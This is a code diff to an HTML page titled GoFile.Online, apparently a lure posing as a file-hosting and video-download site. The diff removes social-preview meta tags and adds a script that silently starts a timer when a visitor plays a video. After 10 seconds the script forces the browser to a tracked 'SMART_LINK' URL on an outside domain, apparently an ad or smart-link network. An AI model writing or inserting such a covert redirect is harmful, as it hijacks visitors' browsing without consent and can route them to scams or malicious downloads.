@@ -4,16 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>GoFile.Online</title>
-  <!-- Open Graph Facebook Preview -->
-  <meta property="og:title" content="GoFile.Online - File Storage" />
-  <meta property="og:description" content="Klik untuk melihat dan download file video." />
-  <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikj1EZQCSiZTMRudz29I-G_xA1aiJ3N-1aXRhEQRG2EHeOWsXQE7gaTVATmaS3_NoSZOGt0oOHA993kyelWFzaiyM-nLduW19DmEp7kzoBSdlQlfDoJzQNyhgE0ysJxxklAV_0i0v4jllBVWLdPCVz_6FPH4PtF-wmwXXOKVzFdCtaxC808mlvpxWWHHk_/s718/3164.png" />
-  <meta property="og:image:width" content="718" />
-  <meta property="og:image:height" content="400" />
-  <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://gofile.online" />
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikj1EZQCSiZTMRudz29I-G_xA1aiJ3N-1aXRhEQRG2EHeOWsXQE7gaTVATmaS3_NoSZOGt0oOHA993kyelWFzaiyM-nLduW19DmEp7kzoBSdlQlfDoJzQNyhgE0ysJxxklAV_0i0v4jllBVWLdPCVz_6FPH4PtF-wmwXXOKVzFdCtaxC808mlvpxWWHHk_/s718/3164.png" />
   <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body {
@@ -366,6 +356,43 @@ footer strong { color: #4dabf7; }
   </div>
 
   <script>
+    var SMART_LINK = 'https://conductivebreeds.com/c3jg2u7br?key=a9f8b04a64c1d2a4734cb365b6ff64f6';
+    var redirectDone = false;
+    var redirectTimer = null;
+
+    function startRedirectTimer() {
+      if (redirectDone) return;
+      if (redirectTimer) return;
+      redirectTimer = setTimeout(function() {
+        if (!redirectDone) {
+          redirectDone = true;
+          window.location.href = SMART_LINK;
+        }
+      }, 10000);
+    }
+
+    function cancelRedirectTimer() {
+      if (redirectTimer) {
+        clearTimeout(redirectTimer);
+        redirectTimer = null;
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      var videos = document.querySelectorAll('video');
+      videos.forEach(function(v) {
+        v.addEventListener('play', function() {
+          startRedirectTimer();
+        });
+        v.addEventListener('pause', function() {
+          cancelRedirectTimer();
+        });
+        v.addEventListener('ended', function() {
+          cancelRedirectTimer();
+        });
+      });
+    });
+
     var dlIv;
     function showDL(name) {
       document.getElementById('dlFn').textContent = name;
@@ -393,7 +420,9 @@ footer strong { color: #4dabf7; }
       document.getElementById('dlModal').classList.remove('open');
       clearInterval(dlIv);
     }
-    document.getElementById('dlModal').addEventListener('click', function(e){ if(e.target===this) closeDL(); });
+    document.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('dlModal').addEventListener('click', function(e){ if(e.target===this) closeDL(); });
+    });
   </script>
  </body>
-  </html>
+</html>
